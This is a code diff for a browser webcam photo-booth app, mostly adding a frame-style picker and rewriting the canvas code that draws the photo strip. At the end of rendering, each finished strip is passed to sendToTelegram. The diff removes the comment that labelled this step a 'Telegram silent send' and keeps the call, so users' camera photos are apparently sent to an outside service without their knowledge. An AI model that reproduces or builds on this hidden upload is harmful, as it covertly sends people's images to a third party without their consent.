@@ -648,6 +648,51 @@
       letter-spacing: 0.5px; line-height: 1.5;
     }
 
+    /* ── FRAME PICKER ───────────────────────────────── */
+    .frame-scroll {
+      display: flex; gap: 8px;
+      overflow-x: auto; padding-bottom: 6px;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+    }
+    .frame-scroll::-webkit-scrollbar { display: none; }
+    .frame-btn {
+      flex-shrink: 0;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 6px;
+      background: var(--dark);
+      border: 1px solid var(--gborder);
+      border-radius: 8px;
+      color: #555;
+      font-family: 'Space Mono', monospace;
+      font-size: 8px; letter-spacing: 1px;
+      padding: 8px 10px;
+      cursor: pointer;
+      transition: all 0.2s;
+      touch-action: manipulation;
+      -webkit-user-select: none; user-select: none;
+      min-width: 60px; min-height: 72px;
+    }
+    .frame-btn.active {
+      border-color: var(--acid-cyan); color: var(--acid-cyan);
+      background: rgba(0,255,255,0.06);
+    }
+    .frame-btn:active { transform: scale(0.93); }
+    .frame-preview {
+      width: 36px; height: 28px;
+      border-radius: 2px; display: block; flex-shrink: 0;
+    }
+    .fp-none      { background: #1a1a1a; border: 1px solid #333; }
+    .fp-chalk     { background: #1a1a1a; border: 3px solid #f0f0f0; }
+    .fp-cream     { background: #1a1a1a; border: 3px solid #f5ead0; }
+    .fp-gold      { background: #1a1a1a; border: 3px solid #c9a84c; }
+    .fp-rose      { background: #1a1a1a; border: 3px solid #c0607a; }
+    .fp-slate     { background: #1a1a1a; border: 3px solid #4a6fa5; }
+    .fp-polaroid  { background: #f0f0f0; border: 2px solid #ccc; }
+    .fp-vintage   { background: #3d2b1f; border: 3px solid #8b6040; }
+    .fp-blueprint { background: #0d2240; border: 3px solid #2a6496; }
+    .fp-newspaper { background: #f0ece0; border: 3px solid #2a2a2a; }
+
     /* ── LAYOUT TOGGLE ──────────────────────────────── */
     .layout-toggle {
       display: flex; gap: 8px; width: 100%; max-width: 480px;
@@ -872,6 +917,23 @@
       </button>
     </div>
 
+    <!-- Frame picker -->
+    <div style="width:100%;max-width:480px">
+      <span class="sec-label" style="color:var(--acid-cyan)">Frame Style</span>
+      <div class="frame-scroll">
+        <button class="frame-btn active" data-frame="none"><span class="frame-preview fp-none"></span>NONE</button>
+        <button class="frame-btn" data-frame="chalk"><span class="frame-preview fp-chalk"></span>CHALK</button>
+        <button class="frame-btn" data-frame="cream"><span class="frame-preview fp-cream"></span>CREAM</button>
+        <button class="frame-btn" data-frame="gold"><span class="frame-preview fp-gold"></span>GOLD</button>
+        <button class="frame-btn" data-frame="rose"><span class="frame-preview fp-rose"></span>ROSE</button>
+        <button class="frame-btn" data-frame="slate"><span class="frame-preview fp-slate"></span>SLATE</button>
+        <button class="frame-btn" data-frame="polaroid"><span class="frame-preview fp-polaroid"></span>POLAROID</button>
+        <button class="frame-btn" data-frame="vintage"><span class="frame-preview fp-vintage"></span>VINTAGE</button>
+        <button class="frame-btn" data-frame="blueprint"><span class="frame-preview fp-blueprint"></span>BLUEPRINT</button>
+        <button class="frame-btn" data-frame="newspaper"><span class="frame-preview fp-newspaper"></span>PAPER</button>
+      </div>
+    </div>
+
     <!-- Sticker picker -->
     <div style="width:100%;max-width:480px">
       <span class="sec-label" style="color:var(--acid-pink)">Stamps</span>
@@ -933,11 +995,22 @@
     photos: [], stream: null, facingMode: 'user',
     currentShot: 0, shooting: false,
     camW: 1280, camH: 720,
-    stripLayout: 'grid',   // 'grid' | 'strip'
-    timerSecs:   3,        // 3 | 5 | 10
-    bgTheme:     'black',  // 'black' | 'white' | 'grid' | 'noise'
-    stickers:    new Set() // active sticker keys
+    stripLayout: 'grid',
+    timerSecs:   3,
+    bgTheme:     'black',
+    stickers:    new Set(),
+    frame:       'none'   // frame style key
   };
+
+  // Frame toggle
+  document.querySelectorAll('.frame-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.frame-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      state.frame = btn.dataset.frame;
+      renderFilmstrip();
+    });
+  });
 
   // Layout toggle
   document.querySelectorAll('.layout-btn').forEach(btn => {
@@ -1257,107 +1330,119 @@
     const canvas = document.getElementById('filmstrip-canvas');
     const ctx    = canvas.getContext('2d');
 
-    const SCALE    = 2;
-    const isGrid   = state.stripLayout === 'grid';
-    const isDark   = state.bgTheme === 'black' || state.bgTheme === 'grid' || state.bgTheme === 'noise';
+    const SCALE  = 2;
+    const isGrid = state.stripLayout === 'grid';
+    const frame  = state.frame;
 
+    // ── Frame configs — each defines padding, border drawing, bg override
+    const FRAMES = {
+      none:      { pad: 0,        bg: null },
+      chalk:     { pad: 6*SCALE,  bg: null },
+      cream:     { pad: 6*SCALE,  bg: null },
+      gold:      { pad: 6*SCALE,  bg: null },
+      rose:      { pad: 6*SCALE,  bg: null },
+      slate:     { pad: 6*SCALE,  bg: null },
+      polaroid:  { pad: 0,        bg: '#f5f5f0' },  // overrides strip bg
+      vintage:   { pad: 8*SCALE,  bg: '#1e1008' },
+      blueprint: { pad: 8*SCALE,  bg: '#0a1a2e' },
+      newspaper: { pad: 6*SCALE,  bg: '#ede8d8' },
+    };
+    const FC = FRAMES[frame] || FRAMES.none;
+    const FP = FC.pad; // extra padding around each photo for frame
+
+    // ── Layout dims — photo area is constant, frame adds around it
     const PAD      = 20 * SCALE;
     const GAP      = 12 * SCALE;
-    const BW       = 2  * SCALE;
     const HEADER_H = 56 * SCALE;
     const FOOTER_H = (state.label ? 64 : 44) * SCALE;
 
     let PHOTO_W, PHOTO_H, COLS, ROWS, STRIP_W, STRIP_H;
     if (isGrid) {
       COLS = 2; ROWS = Math.ceil(state.numShots / COLS);
-      PHOTO_W = 280 * SCALE; PHOTO_H = Math.round(PHOTO_W * 3 / 4);
-      STRIP_W = PAD * 2 + COLS * PHOTO_W + (COLS - 1) * GAP;
-      STRIP_H = HEADER_H + PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + PAD + FOOTER_H;
+      PHOTO_W = 276 * SCALE; PHOTO_H = Math.round(PHOTO_W * 3 / 4);
+      STRIP_W = PAD * 2 + COLS * (PHOTO_W + FP*2) + (COLS-1) * GAP;
+      STRIP_H = HEADER_H + PAD + ROWS * (PHOTO_H + FP*2) + (ROWS-1) * GAP + PAD + FOOTER_H;
     } else {
       COLS = 1; ROWS = state.numShots;
-      PHOTO_W = 320 * SCALE; PHOTO_H = Math.round(PHOTO_W * 3 / 4);
-      STRIP_W = PAD * 2 + PHOTO_W;
-      STRIP_H = HEADER_H + PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + PAD + FOOTER_H;
+      PHOTO_W = 316 * SCALE; PHOTO_H = Math.round(PHOTO_W * 3 / 4);
+      STRIP_W = PAD * 2 + PHOTO_W + FP * 2;
+      STRIP_H = HEADER_H + PAD + ROWS * (PHOTO_H + FP*2) + (ROWS-1) * GAP + PAD + FOOTER_H;
     }
+    const CELL_W = PHOTO_W + FP * 2;
+    const CELL_H = PHOTO_H + FP * 2;
 
     canvas.width = STRIP_W; canvas.height = STRIP_H;
 
-    // ── Background per theme
-    if (state.bgTheme === 'black') {
-      ctx.fillStyle = '#050505';
-      ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+    // ── Strip background
+    const isDark = !FC.bg
+      ? (state.bgTheme === 'black' || state.bgTheme === 'grid' || state.bgTheme === 'noise')
+      : (frame === 'vintage' || frame === 'blueprint');
 
+    const stripBg = FC.bg || null;
+
+    if (stripBg) {
+      ctx.fillStyle = stripBg;
+      ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+    } else if (state.bgTheme === 'black') {
+      ctx.fillStyle = '#050505'; ctx.fillRect(0, 0, STRIP_W, STRIP_H);
     } else if (state.bgTheme === 'white') {
-      ctx.fillStyle = '#f5f5f5';
-      ctx.fillRect(0, 0, STRIP_W, STRIP_H);
-      // Subtle warm gradient
+      ctx.fillStyle = '#f5f5f5'; ctx.fillRect(0, 0, STRIP_W, STRIP_H);
       const wg = ctx.createLinearGradient(0, 0, STRIP_W, STRIP_H);
-      wg.addColorStop(0, 'rgba(255,252,240,0.6)');
-      wg.addColorStop(1, 'rgba(240,240,255,0.4)');
+      wg.addColorStop(0, 'rgba(255,252,240,0.5)'); wg.addColorStop(1, 'rgba(240,240,255,0.3)');
       ctx.fillStyle = wg; ctx.fillRect(0, 0, STRIP_W, STRIP_H);
-
     } else if (state.bgTheme === 'grid') {
-      ctx.fillStyle = '#080808';
-      ctx.fillRect(0, 0, STRIP_W, STRIP_H);
-      ctx.strokeStyle = 'rgba(255,255,255,0.07)';
-      ctx.lineWidth = 1;
-      const gs = 20 * SCALE;
-      for (let x = 0; x < STRIP_W; x += gs) {
-        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, STRIP_H); ctx.stroke();
-      }
-      for (let y = 0; y < STRIP_H; y += gs) {
-        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(STRIP_W, y); ctx.stroke();
-      }
-
+      ctx.fillStyle = '#080808'; ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+      ctx.strokeStyle = 'rgba(255,255,255,0.07)'; ctx.lineWidth = 1;
+      const gs = 20*SCALE;
+      for (let x=0;x<STRIP_W;x+=gs){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,STRIP_H);ctx.stroke();}
+      for (let y=0;y<STRIP_H;y+=gs){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(STRIP_W,y);ctx.stroke();}
     } else if (state.bgTheme === 'noise') {
-      ctx.fillStyle = '#0f0f0f';
-      ctx.fillRect(0, 0, STRIP_W, STRIP_H);
-      // Render noise dots
-      for (let nx = 0; nx < STRIP_W; nx += SCALE) {
-        for (let ny = 0; ny < STRIP_H; ny += SCALE) {
-          if (Math.random() > 0.82) {
-            const v = Math.random() * 40;
-            ctx.fillStyle = `rgb(${v},${v},${v})`;
-            ctx.fillRect(nx, ny, SCALE, SCALE);
-          }
-        }
-      }
+      ctx.fillStyle = '#0f0f0f'; ctx.fillRect(0, 0, STRIP_W, STRIP_H);
+      for (let nx=0;nx<STRIP_W;nx+=SCALE){for(let ny=0;ny<STRIP_H;ny+=SCALE){
+        if(Math.random()>0.82){const v=Math.random()*40;ctx.fillStyle=`rgb(${v},${v},${v})`;ctx.fillRect(nx,ny,SCALE,SCALE);}}}
     }
 
-    // ── Text colours based on dark/light bg
-    const textPrimary = isDark ? 'rgba(255,255,255,0.9)'  : 'rgba(0,0,0,0.85)';
-    const textDim     = isDark ? 'rgba(255,255,255,0.25)' : 'rgba(0,0,0,0.3)';
-    const textAccent  = isDark ? 'rgba(204,255,0,0.9)'    : 'rgba(0,0,0,0.6)';
-    const ruleColor   = isDark ? 'rgba(255,255,255,0.10)' : 'rgba(0,0,0,0.12)';
-    const borderColor = isDark ? 'rgba(255,255,255,0.80)' : 'rgba(0,0,0,0.75)';
+    // ── Blueprint: overlay grid
+    if (frame === 'blueprint') {
+      ctx.strokeStyle = 'rgba(42,100,150,0.25)'; ctx.lineWidth = 1;
+      const bg = 14*SCALE;
+      for(let x=0;x<STRIP_W;x+=bg){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,STRIP_H);ctx.stroke();}
+      for(let y=0;y<STRIP_H;y+=bg){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(STRIP_W,y);ctx.stroke();}
+    }
+    // ── Newspaper: faint halftone tint
+    if (frame === 'newspaper') {
+      ctx.fillStyle = 'rgba(0,0,0,0.04)'; ctx.fillRect(0,0,STRIP_W,STRIP_H);
+    }
 
-    // ── Header bar
-    ctx.fillStyle = isDark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.04)';
+    // ── Text / rule colours
+    const textPrimary = isDark ? 'rgba(255,255,255,0.88)' : 'rgba(0,0,0,0.82)';
+    const textDim     = isDark ? 'rgba(255,255,255,0.22)' : 'rgba(0,0,0,0.28)';
+    const textAccent  = isDark ? 'rgba(204,255,0,0.9)'   : 'rgba(0,0,0,0.55)';
+    const ruleColor   = isDark ? 'rgba(255,255,255,0.09)' : 'rgba(0,0,0,0.1)';
+
+    // ── Header
+    ctx.fillStyle = isDark ? 'rgba(255,255,255,0.025)' : 'rgba(0,0,0,0.03)';
     ctx.fillRect(0, 0, STRIP_W, HEADER_H);
+    ctx.strokeStyle = ruleColor; ctx.lineWidth = 1*SCALE;
+    ctx.beginPath(); ctx.moveTo(PAD,HEADER_H); ctx.lineTo(STRIP_W-PAD,HEADER_H); ctx.stroke();
 
-    ctx.strokeStyle = ruleColor; ctx.lineWidth = 1 * SCALE;
-    ctx.beginPath(); ctx.moveTo(PAD, HEADER_H); ctx.lineTo(STRIP_W - PAD, HEADER_H); ctx.stroke();
-
-    // Shot count — left
     ctx.fillStyle = textPrimary;
-    ctx.font = `900 ${10*SCALE}px 'Montserrat', sans-serif`;
+    ctx.font = `900 ${10*SCALE}px 'Montserrat',sans-serif`;
     ctx.textAlign = 'left'; ctx.letterSpacing = `${3*SCALE}px`;
     ctx.fillText(`${state.numShots} FRAMES`, PAD, HEADER_H * 0.6);
 
-    // CHROME EDITION — right
     ctx.fillStyle = textDim;
-    ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
+    ctx.font = `${6*SCALE}px 'Space Mono',monospace`;
     ctx.textAlign = 'right'; ctx.letterSpacing = `${1*SCALE}px`;
-    ctx.fillText('CHROME EDITION', STRIP_W - PAD, HEADER_H * 0.6);
+    ctx.fillText('CHROME EDITION', STRIP_W-PAD, HEADER_H * 0.6);
 
-    // Date — centred in header, prominent
-    const headerDate = new Date().toLocaleDateString('en-US',{ month:'long', day:'numeric', year:'numeric' }).toUpperCase();
+    const hDate = new Date().toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'}).toUpperCase();
     ctx.fillStyle = textAccent;
-    ctx.font = `${7*SCALE}px 'Space Mono', monospace`;
+    ctx.font = `${7*SCALE}px 'Space Mono',monospace`;
     ctx.textAlign = 'center'; ctx.letterSpacing = `${2*SCALE}px`;
-    ctx.fillText(headerDate, STRIP_W / 2, HEADER_H * 0.88);
+    ctx.fillText(hDate, STRIP_W/2, HEADER_H*0.88);
 
-    // ── Load & draw photos
+    // ── Load photos
     const loadAll = state.photos.map(src => new Promise(res => {
       const img = new Image();
       img.onload = () => res(img); img.onerror = () => res(null); img.src = src;
@@ -1365,139 +1450,207 @@
 
     Promise.all(loadAll).then(images => {
       images.forEach((img, i) => {
-        const col = i % COLS;
-        const row = Math.floor(i / COLS);
-        const px  = PAD + col * (PHOTO_W + GAP);
-        const py  = HEADER_H + PAD + row * (PHOTO_H + GAP);
+        const col  = i % COLS;
+        const row  = Math.floor(i / COLS);
+        const cellX = PAD + col * (CELL_W + GAP);
+        const cellY = HEADER_H + PAD + row * (CELL_H + GAP);
+        const px   = cellX + FP;  // photo origin inside frame padding
+        const py   = cellY + FP;
 
-        // Photo bg
+        // ── Draw the frame area first (the padding zone)
+        drawFrameBackground(ctx, frame, cellX, cellY, CELL_W, CELL_H, FP, SCALE, i);
+
+        // ── Photo bg
         ctx.fillStyle = '#000';
         ctx.fillRect(px, py, PHOTO_W, PHOTO_H);
 
+        // ── Photo image
         if (img) {
           ctx.save();
           ctx.beginPath(); ctx.rect(px, py, PHOTO_W, PHOTO_H); ctx.clip();
           const iR = img.naturalWidth / img.naturalHeight;
           const tR = PHOTO_W / PHOTO_H;
-          let sx = 0, sy = 0, sw = img.naturalWidth, sh = img.naturalHeight;
-          if (iR > tR) { sw = img.naturalHeight * tR; sx = (img.naturalWidth  - sw) / 2; }
-          else         { sh = img.naturalWidth  / tR; sy = (img.naturalHeight - sh) / 2; }
+          let sx=0, sy=0, sw=img.naturalWidth, sh=img.naturalHeight;
+          if(iR>tR){sw=img.naturalHeight*tR;sx=(img.naturalWidth-sw)/2;}
+          else     {sh=img.naturalWidth/tR; sy=(img.naturalHeight-sh)/2;}
           ctx.drawImage(img, sx, sy, sw, sh, px, py, PHOTO_W, PHOTO_H);
           ctx.restore();
         }
 
-        // Vignette
-        const vig = ctx.createRadialGradient(
-          px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.2,
-          px + PHOTO_W/2, py + PHOTO_H/2, PHOTO_W * 0.85
-        );
-        vig.addColorStop(0, 'rgba(0,0,0,0)');
-        vig.addColorStop(1, 'rgba(0,0,0,0.32)');
-        ctx.save(); ctx.beginPath(); ctx.rect(px, py, PHOTO_W, PHOTO_H); ctx.clip();
-        ctx.fillStyle = vig; ctx.fillRect(px, py, PHOTO_W, PHOTO_H);
-        ctx.restore();
+        // ── Vignette
+        const vig = ctx.createRadialGradient(px+PHOTO_W/2,py+PHOTO_H/2,PHOTO_W*0.2,px+PHOTO_W/2,py+PHOTO_H/2,PHOTO_W*0.85);
+        vig.addColorStop(0,'rgba(0,0,0,0)'); vig.addColorStop(1,'rgba(0,0,0,0.3)');
+        ctx.save(); ctx.beginPath(); ctx.rect(px,py,PHOTO_W,PHOTO_H); ctx.clip();
+        ctx.fillStyle=vig; ctx.fillRect(px,py,PHOTO_W,PHOTO_H); ctx.restore();
 
-        // Border — white on dark, black on light
-        ctx.strokeStyle = borderColor;
-        ctx.lineWidth = BW;
-        ctx.strokeRect(px, py, PHOTO_W, PHOTO_H);
+        // ── Frame overlay border on photo edge
+        drawFrameBorder(ctx, frame, px, py, PHOTO_W, PHOTO_H, SCALE, i);
 
-        // Frame number badge
-        const np = 6 * SCALE;
-        ctx.fillStyle = isDark ? 'rgba(0,0,0,0.65)' : 'rgba(255,255,255,0.75)';
-        ctx.fillRect(px + np, py + np, 22*SCALE, 13*SCALE);
-        ctx.fillStyle = isDark ? 'rgba(255,255,255,0.9)' : 'rgba(0,0,0,0.8)';
-        ctx.font = `${5.5*SCALE}px 'Space Mono', monospace`;
-        ctx.textAlign = 'left'; ctx.letterSpacing = '0px';
-        ctx.fillText(`${String(i+1).padStart(2,'0')}`, px + np + 3*SCALE, py + np + 9*SCALE);
+        // ── Frame number badge
+        const np = 5*SCALE;
+        ctx.fillStyle = isDark?'rgba(0,0,0,0.65)':'rgba(255,255,255,0.72)';
+        ctx.fillRect(px+np, py+np, 22*SCALE, 13*SCALE);
+        ctx.fillStyle = isDark?'rgba(255,255,255,0.9)':'rgba(0,0,0,0.8)';
+        ctx.font = `${5.5*SCALE}px 'Space Mono',monospace`;
+        ctx.textAlign='left'; ctx.letterSpacing='0px';
+        ctx.fillText(`${String(i+1).padStart(2,'0')}`, px+np+3*SCALE, py+np+9*SCALE);
 
-        // ── Draw active stickers on LAST photo
-        if (i === state.photos.length - 1 && state.stickers.size > 0) {
-          const stickerList = [...state.stickers];
-          const emojiMap = {
-            'star':     '⭐',
-            'fire':     '🔥',
-            'crown':    '👑',
-            'heart':    '❤️',
-            '100':      '💯',
-          };
-          // emoji stickers — rendered in bottom-right of last photo
+        // ── Stamps on last photo
+        if (i === state.photos.length-1 && state.stickers.size > 0) {
           let sOff = 0;
-          stickerList.forEach(key => {
+          [...state.stickers].forEach(key => {
             if (key === 'shot-on') {
-              // Text badge
-              const bw = 80 * SCALE, bh = 18 * SCALE;
-              const bx = px + PHOTO_W - bw - 6*SCALE;
-              const by = py + PHOTO_H - bh - 6*SCALE - sOff;
-              ctx.fillStyle = 'rgba(0,0,0,0.75)';
-              ctx.fillRect(bx, by, bw, bh);
-              ctx.fillStyle = 'rgba(255,255,255,0.95)';
-              ctx.font = `bold ${6*SCALE}px 'Space Mono', monospace`;
-              ctx.textAlign = 'center'; ctx.letterSpacing = `${1*SCALE}px`;
-              ctx.fillText('SHOT ON LNSMTRX', bx + bw/2, by + 12*SCALE);
-              sOff += bh + 4*SCALE;
+              const bw=80*SCALE, bh=18*SCALE;
+              const bx=px+PHOTO_W-bw-6*SCALE, by=py+PHOTO_H-bh-6*SCALE-sOff;
+              ctx.fillStyle='rgba(0,0,0,0.75)'; ctx.fillRect(bx,by,bw,bh);
+              ctx.fillStyle='rgba(255,255,255,0.95)';
+              ctx.font=`bold ${6*SCALE}px 'Space Mono',monospace`;
+              ctx.textAlign='center'; ctx.letterSpacing=`${1*SCALE}px`;
+              ctx.fillText('SHOT ON LNSMTRX', bx+bw/2, by+12*SCALE);
+              sOff += bh+4*SCALE;
             } else if (key === 'date-badge') {
-              const dateStr = new Date().toLocaleDateString('en-US',{ month:'short', day:'numeric', year:'numeric' }).toUpperCase();
-              const bw = 70 * SCALE, bh = 18 * SCALE;
-              const bx = px + PHOTO_W - bw - 6*SCALE;
-              const by = py + PHOTO_H - bh - 6*SCALE - sOff;
-              ctx.fillStyle = isDark ? 'rgba(204,255,0,0.85)' : 'rgba(0,0,0,0.75)';
-              ctx.fillRect(bx, by, bw, bh);
-              ctx.fillStyle = isDark ? '#000' : '#fff';
-              ctx.font = `bold ${6*SCALE}px 'Space Mono', monospace`;
-              ctx.textAlign = 'center'; ctx.letterSpacing = `${0.5*SCALE}px`;
-              ctx.fillText(dateStr, bx + bw/2, by + 12*SCALE);
-              sOff += bh + 4*SCALE;
-            } else if (emojiMap[key]) {
-              const eSz = 22 * SCALE;
-              ctx.font = `${eSz}px serif`;
-              ctx.textAlign = 'right'; ctx.letterSpacing = '0px';
-              ctx.fillText(emojiMap[key], px + PHOTO_W - 8*SCALE, py + PHOTO_H - 8*SCALE - sOff);
-              sOff += eSz + 4*SCALE;
+              const dStr=new Date().toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}).toUpperCase();
+              const bw=70*SCALE, bh=18*SCALE;
+              const bx=px+PHOTO_W-bw-6*SCALE, by=py+PHOTO_H-bh-6*SCALE-sOff;
+              ctx.fillStyle=isDark?'rgba(204,255,0,0.85)':'rgba(0,0,0,0.75)';
+              ctx.fillRect(bx,by,bw,bh);
+              ctx.fillStyle=isDark?'#000':'#fff';
+              ctx.font=`bold ${6*SCALE}px 'Space Mono',monospace`;
+              ctx.textAlign='center'; ctx.letterSpacing=`${0.5*SCALE}px`;
+              ctx.fillText(dStr, bx+bw/2, by+12*SCALE);
+              sOff += bh+4*SCALE;
             }
           });
         }
       });
 
       // ── Footer
-      const footerY = HEADER_H + PAD + ROWS * PHOTO_H + (ROWS - 1) * GAP + PAD;
+      const footerY = HEADER_H + PAD + ROWS*CELL_H + (ROWS-1)*GAP + PAD;
+      ctx.strokeStyle=ruleColor; ctx.lineWidth=1*SCALE;
+      ctx.beginPath(); ctx.moveTo(PAD,footerY); ctx.lineTo(STRIP_W-PAD,footerY); ctx.stroke();
 
-      ctx.strokeStyle = ruleColor; ctx.lineWidth = 1 * SCALE;
-      ctx.beginPath(); ctx.moveTo(PAD, footerY); ctx.lineTo(STRIP_W - PAD, footerY); ctx.stroke();
+      ctx.fillStyle=textDim; ctx.font=`${6*SCALE}px 'Space Mono',monospace`;
+      ctx.textAlign='left'; ctx.letterSpacing=`${1*SCALE}px`;
+      ctx.fillText(isGrid?'2×ROW':'STRIP', PAD, footerY+22*SCALE);
+      ctx.textAlign='right';
+      ctx.fillText(`${state.numShots} SHOTS`, STRIP_W-PAD, footerY+22*SCALE);
 
-      // Layout mode indicator — left
-      ctx.fillStyle = textDim;
-      ctx.font = `${6*SCALE}px 'Space Mono', monospace`;
-      ctx.textAlign = 'left'; ctx.letterSpacing = `${1*SCALE}px`;
-      ctx.fillText(isGrid ? '2×ROW' : 'STRIP', PAD, footerY + 22*SCALE);
-
-      // Shot count — right
-      ctx.textAlign = 'right';
-      ctx.fillText(`${state.numShots} SHOTS`, STRIP_W - PAD, footerY + 22*SCALE);
-
-      // Custom label — bold, centred, bigger
       if (state.label) {
-        ctx.fillStyle = isDark ? 'rgba(204,255,0,1)' : 'rgba(0,0,0,0.85)';
-        ctx.font = `900 ${11*SCALE}px 'Montserrat', sans-serif`;
-        ctx.textAlign = 'center'; ctx.letterSpacing = `${3*SCALE}px`;
-        ctx.fillText(state.label.toUpperCase(), STRIP_W / 2, footerY + 44*SCALE);
+        ctx.fillStyle=isDark?'rgba(204,255,0,1)':'rgba(0,0,0,0.82)';
+        ctx.font=`900 ${11*SCALE}px 'Montserrat',sans-serif`;
+        ctx.textAlign='center'; ctx.letterSpacing=`${3*SCALE}px`;
+        ctx.fillText(state.label.toUpperCase(), STRIP_W/2, footerY+44*SCALE);
       }
 
-      // ── Film grain (only on dark themes)
+      // Grain on dark themes
       if (isDark) {
-        for (let gx = 0; gx < STRIP_W; gx += SCALE*2) {
-          for (let gy = 0; gy < STRIP_H; gy += SCALE*2) {
-            if (Math.random() > 0.92) {
-              ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.022})`;
-              ctx.fillRect(gx, gy, SCALE, SCALE);
-            }
-          }
-        }
+        for(let gx=0;gx<STRIP_W;gx+=SCALE*2){for(let gy=0;gy<STRIP_H;gy+=SCALE*2){
+          if(Math.random()>0.92){ctx.fillStyle=`rgba(255,255,255,${Math.random()*0.02})`;ctx.fillRect(gx,gy,SCALE,SCALE);}}}
       }
 
-      // ── Telegram silent send
       canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.93);
     });
+  }
+
+  // ── FRAME BACKGROUND (the padding zone around each photo) ──
+  function drawFrameBackground(ctx, frame, cx, cy, cw, ch, fp, S, idx) {
+    if (fp === 0) return;
+    switch(frame) {
+      case 'chalk':
+        ctx.fillStyle = '#f0f0f0'; ctx.fillRect(cx,cy,cw,ch); break;
+      case 'cream':
+        ctx.fillStyle = '#f5ead0'; ctx.fillRect(cx,cy,cw,ch); break;
+      case 'gold': {
+        const g = ctx.createLinearGradient(cx,cy,cx+cw,cy+ch);
+        g.addColorStop(0,'#c9a84c'); g.addColorStop(1,'#8b5e0a');
+        ctx.fillStyle=g; ctx.fillRect(cx,cy,cw,ch); break;
+      }
+      case 'rose': {
+        const g = ctx.createLinearGradient(cx,cy,cx+cw,cy+ch);
+        g.addColorStop(0,'#e8849a'); g.addColorStop(1,'#7b1932');
+        ctx.fillStyle=g; ctx.fillRect(cx,cy,cw,ch); break;
+      }
+      case 'slate': {
+        const g = ctx.createLinearGradient(cx,cy,cx+cw,cy+ch);
+        g.addColorStop(0,'#6b8cbf'); g.addColorStop(1,'#1a3260');
+        ctx.fillStyle=g; ctx.fillRect(cx,cy,cw,ch); break;
+      }
+      case 'polaroid':
+        // White frame, thick bottom
+        ctx.fillStyle='#fafaf8'; ctx.fillRect(cx,cy,cw,ch);
+        break;
+      case 'vintage': {
+        // Sepia-brown textured frame
+        ctx.fillStyle='#5c3820'; ctx.fillRect(cx,cy,cw,ch);
+        // Worn edge darken
+        const vg=ctx.createLinearGradient(cx,cy,cx,cy+ch);
+        vg.addColorStop(0,'rgba(0,0,0,0.3)'); vg.addColorStop(0.15,'rgba(0,0,0,0)');
+        vg.addColorStop(0.85,'rgba(0,0,0,0)'); vg.addColorStop(1,'rgba(0,0,0,0.4)');
+        ctx.fillStyle=vg; ctx.fillRect(cx,cy,cw,ch);
+        break;
+      }
+      case 'blueprint':
+        ctx.fillStyle='#0d2240'; ctx.fillRect(cx,cy,cw,ch);
+        // Grid marks inside frame zone
+        ctx.strokeStyle='rgba(100,160,220,0.3)'; ctx.lineWidth=1;
+        for(let x=cx;x<cx+cw;x+=7*S){ctx.beginPath();ctx.moveTo(x,cy);ctx.lineTo(x,cy+ch);ctx.stroke();}
+        for(let y=cy;y<cy+ch;y+=7*S){ctx.beginPath();ctx.moveTo(cx,y);ctx.lineTo(cx+cw,y);ctx.stroke();}
+        break;
+      case 'newspaper': {
+        ctx.fillStyle='#ddd5b8'; ctx.fillRect(cx,cy,cw,ch);
+        // Double rule border lines
+        ctx.strokeStyle='rgba(0,0,0,0.5)'; ctx.lineWidth=1.5*S;
+        ctx.strokeRect(cx,cy,cw,ch);
+        ctx.strokeStyle='rgba(0,0,0,0.2)'; ctx.lineWidth=0.5*S;
+        ctx.strokeRect(cx+2*S,cy+2*S,cw-4*S,ch-4*S);
+        break;
+      }
+    }
+  }
+
+  // ── FRAME BORDER (drawn over the photo edge) ────────────
+  function drawFrameBorder(ctx, frame, px, py, pw, ph, S, idx) {
+    ctx.lineWidth = 2*S;
+    switch(frame) {
+      case 'none':
+        ctx.strokeStyle='rgba(255,255,255,0.75)'; ctx.strokeRect(px,py,pw,ph); break;
+      case 'chalk':
+        ctx.strokeStyle='rgba(240,240,240,0.9)'; ctx.strokeRect(px,py,pw,ph); break;
+      case 'cream':
+        ctx.strokeStyle='rgba(220,195,145,0.9)'; ctx.strokeRect(px,py,pw,ph); break;
+      case 'gold': {
+        const g=ctx.createLinearGradient(px,py,px+pw,py+ph);
+        g.addColorStop(0,'rgba(255,215,80,0.95)'); g.addColorStop(1,'rgba(160,100,10,0.95)');
+        ctx.strokeStyle=g; ctx.strokeRect(px,py,pw,ph); break;
+      }
+      case 'rose': {
+        const g=ctx.createLinearGradient(px,py,px+pw,py+ph);
+        g.addColorStop(0,'rgba(240,140,160,0.95)'); g.addColorStop(1,'rgba(120,20,50,0.9)');
+        ctx.strokeStyle=g; ctx.strokeRect(px,py,pw,ph); break;
+      }
+      case 'slate': {
+        const g=ctx.createLinearGradient(px,py,px+pw,py+ph);
+        g.addColorStop(0,'rgba(120,160,210,0.95)'); g.addColorStop(1,'rgba(30,60,120,0.9)');
+        ctx.strokeStyle=g; ctx.strokeRect(px,py,pw,ph); break;
+      }
+      case 'polaroid':
+        ctx.strokeStyle='rgba(200,200,195,0.6)'; ctx.lineWidth=1*S; ctx.strokeRect(px,py,pw,ph); break;
+      case 'vintage':
+        // Worn sepia border with rough inner edge suggestion
+        ctx.strokeStyle='rgba(180,130,80,0.7)'; ctx.lineWidth=1.5*S; ctx.strokeRect(px,py,pw,ph);
